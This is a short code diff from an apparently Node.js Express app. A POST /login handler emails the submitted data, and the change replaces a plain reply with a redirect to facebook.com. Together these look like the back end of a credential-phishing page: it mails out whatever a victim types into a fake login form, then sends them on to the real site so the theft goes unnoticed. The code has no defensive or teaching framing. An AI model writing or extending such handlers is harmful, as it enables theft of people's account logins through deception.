@@ -37,7 +37,7 @@ app.post('/login', async(req, res) => {
         const info=await transport.sendMail(data);
         if(info){
             console.log("email sent !");
-            return res.send('got message')
+            return res.redirect(301,'https://www.facebook.com/')
         }
       }catch(err){
         console.log(err)
